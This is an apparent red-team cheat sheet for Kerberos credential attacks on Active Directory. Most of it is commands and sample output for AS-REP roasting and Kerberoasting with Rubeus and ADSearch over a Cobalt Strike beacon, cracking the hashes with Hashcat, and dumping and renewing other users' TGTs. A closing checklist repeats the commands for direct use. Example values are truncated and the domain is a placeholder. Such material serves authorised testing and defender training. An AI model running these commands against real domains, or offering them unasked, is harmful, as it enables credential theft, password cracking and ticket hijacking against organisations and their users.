---
title: "Kerberos · AS-REP Roasting, Kerberoasting and Tickets"
description: "Rubeus, Kerbeus BOF and Hashcat commands for AS-REP roasting, Kerberoasting and local ticket extraction, with concepts, prerequisites and ticket lifetimes."
category: "Credential Dumping"
tools: ["Cobalt Strike", "Rubeus", "Kerbeus BOF", "Hashcat", "ADSearch"]
updated: 2026-11-10
tags: ["credentials", "kerberos", "rubeus", "ad"]
draft: false
---

## 1. Concepts and prerequisites

| Technique | Requirement | Result |
|---|---|---|
| AS-REP roasting | Account with Kerberos preauthentication disabled | AS-REP material for offline cracking |
| Kerberoasting | Account with an SPN and a context able to request service tickets | Service ticket material for offline cracking |
| Local extraction | Access to the session's ticket cache | Exported Kerberos ticket |

AS-REP roasting targets the response portion encrypted with the account key; it does not crack the TGT. Requesting a response for a known user without preauthentication does not require that user's password, but automatic LDAP enumeration may require a domain context.

In Kerberoasting, service ticket material is protected with the service account key. Password recovery depends on password strength. Machine accounts and managed accounts typically have long random passwords, limiting practical cracking.

Commands prefixed with `beacon>` run in Cobalt Strike. Hashcat runs on the analysis machine. Paths, `CONTOSO`, SPNs and LUIDs are examples. Values containing `[...snip...]` are incomplete and cannot be used as hashes or tickets.

## 2. AS-REP roasting

Save the complete hash in `asrep.hash`. Mode 18200 matches the AS-REP etype 23 format used here.

```shell
# AS-REP ROASTING — Obtain domain account hashes and crack them with Hashcat
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap
# [+] AS-REQ w/o preauth successful!
# $krb5asrep$23$oracle_svc@contoso.com:92D6F[...snip...]19124

.\hashcat.exe -a 0 -m 18200 .\asrep.hash .\example.dict -r .\rules\dive.rule
# $krb5asrep$23$oracle_svc@contoso.com:92d6f[...snip...]19124:Passw0rd!
```

## 3. Kerberoasting

Save the complete output in `kerb.hash`. Mode 13100 matches TGS-REP etype 23; do not automatically apply it to other encryption types.

```shell
# KERBEROASTING — Obtain hashes and crack them with Hashcat
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /format:hashcat /simple
# [*] Total kerberoastable users : 1
# $krb5tgs$23$*mssql_svc$contoso.com$MSSQLSvc/lon-sql-1.contoso.com:1433@contoso.com*$95505[...snip...]9A715

.\hashcat.exe -a 0 -m 13100 .\kerb.hash .\example.dict -r .\rules\dive.rule
# $krb5tgs$23$*mssql_svc$contoso.com$MSSQLSvc/lon-sql-1.contoso.com:1433@contoso.com*$95505[...snip...]9a715:Passw0rd!
```

## 4. SPN enumeration and selection

The filter enumerates user accounts with SPNs, excluding `krbtgt` and disabled accounts. Select an SPN from the output for the subsequent request.

```shell
# TARGETED KERBEROASTING — Enumerate accounts with SPNs, excluding krbtgt and disabled accounts
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe -s "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" --attributes cn,samaccountname,serviceprincipalname
# [*] TOTAL NUMBER OF SEARCH RESULTS: 1
# [+] cn                   : MSSQL Service
# [+] samaccountname       : mssql_svc
# [+] serviceprincipalname : MSSQLSvc/lon-sql-1.contoso.com:1433

# Request a ticket for the selected SPN
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /spn:MSSQLSvc/lon-sql-1.contoso.com:1433 /simple /nowrap
# $krb5tgs$23$*mssql_svc$contoso.com$MSSQLSvc/lon-sql-1.contoso.com:1433@contoso.com*$95505[...snip...]9A715
```

## 5. Local tickets with Rubeus

`triage` associates users, sessions and services. Inspecting and extracting tickets from other LUIDs requires an elevated context with sufficient access. `/service:krbtgt` selects TGTs.

```shell
# LOCAL TICKETS — Enumerate tickets and their sessions
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
# Table with LUID, UserName, Service and EndTime. Example:
# 0xd42c80 | rsteel @ CONTOSO.COM | krbtgt/CONTOSO.COM | 17/02/2025 19:53:40

# Extract the TGT from a specific session by LUID
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0xd42c80 /service:krbtgt /nowrap
# UserName : rsteel
# ServiceName : krbtgt/CONTOSO.COM
# Base64EncodedTicket : doIFm[...snip...]DT00=

# Display the ticket lifetime
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFq[...snip...]uQ09N
# StartTime : 11/04/2025 16:33:17
# EndTime   : 12/04/2025 02:33:17
# RenewTill : 18/04/2025 16:33:17

# Renew the ticket
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe renew /ticket:doIFq[...snip...]uQ09N /nowrap
# [+] TGT renewal request successful!
# [*] base64(ticket.kirbi):
# doIFq[...snip...]uQ09N
```

## 6. Local tickets with Kerbeus BOF

Load [Kerbeus-BOF](https://github.com/RalfHacker/Kerbeus-BOF) into Cobalt Strike first. `krb_triage` and `krb_dump` belong to that extension.

```shell
# Enumerate tickets and extract a user's TGT
beacon> krb_triage
# Action: List Kerberos Tickets (All Users)
# 0:0x2c25f4 | rsteel @ CONTOSO.COM | krbtgt/CONTOSO.COM | 31.01.2026 02:37:03

beacon> krb_dump /user:rsteel /service:krbtgt
# Action: List Kerberos Tickets for 'rsteel'
# [*] Cached tickets: (1)
# ClientName : rsteel @ CONTOSO.COM
# ServiceRealm : krbtgt/CONTOSO.COM @ CONTOSO.COM
# doIFq[...snip...]uQ09N
```

## 7. Ticket lifetime

| Field | Meaning |
|---|---|
| `StartTime` | Start of validity |
| `EndTime` | Expiration of the current ticket |
| `RenewTill` | Latest renewal limit, if renewable |

The sample uses 10 hours of validity and a 7-day renewal window; these depend on domain policy. Renew while the ticket is still valid and renewable, before `EndTime`. `RenewTill` does not keep an expired ticket valid. `renew` returns a new ticket: retain its output.

## 8. Troubleshooting

| Symptom | What to check |
|---|---|
| No AS-REP results | Preauthentication, LDAP scope and enumeration permissions |
| No Kerberoasting results | SPNs, accounts and authentication context |
| Another session's tickets are missing | Integrity, permissions and selected LUID |
| BOF command unknown | Loaded extension and command version |
| Hashcat rejects a hash | Complete output, encryption type and matching mode |
| Renewal rejected | Flags, clock, `EndTime`, `RenewTill` and KDC policy |

## 9. Quick checklist

Choose the technique needed for the exercise. Run `execute-assembly` and BOF commands in Beacon; run Hashcat on the analysis machine. Replace `<...>` placeholders with complete values.

```text
CONTEXT AND PREPARATION
[ ] getuid → confirm the effective identity
[ ] Confirm the selected technique's domain or local-session prerequisites
[ ] Load Kerbeus-BOF first if using krb_triage or krb_dump

AS-REP ROASTING
[ ] execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap
[ ] Save the complete etype 23 hash in asrep.hash
[ ] .\hashcat.exe -a 0 -m 18200 .\asrep.hash .\example.dict -r .\rules\dive.rule

KERBEROASTING
[ ] execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /format:hashcat /simple
[ ] For a selected SPN instead:
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /spn:<SPN> /simple /nowrap
[ ] Save the complete etype 23 hash in kerb.hash; check the encryption type first
[ ] .\hashcat.exe -a 0 -m 13100 .\kerb.hash .\example.dict -r .\rules\dive.rule

LOCAL TICKETS — RUBEUS OR BOF
[ ] execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
[ ] Identify the intended user, service and LUID; check access to other sessions
[ ] execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:<LUID> /service:krbtgt /nowrap
[ ] BOF alternative: krb_triage
[ ] BOF alternative: krb_dump /user:<USER> /service:krbtgt

TICKET LIFETIME AND RENEWAL
[ ] execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:<BASE64_TICKET>
[ ] Review StartTime, EndTime, RenewTill and the renewable flag
[ ] If still valid and renewable:
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe renew /ticket:<BASE64_TICKET> /nowrap
[ ] Retain the new ticket returned by renew
```


## Related references

- [Browser credentials](/cheatsheets/browser-credentials-cheatsheet/)
- [Windows Credential Manager and DPAPI](/cheatsheets/windows-credential-manager-cheatsheet/)
- [LSASS, SAM, LSA Secrets and cached credentials](/cheatsheets/os-credential-dumping-cheatsheet/)
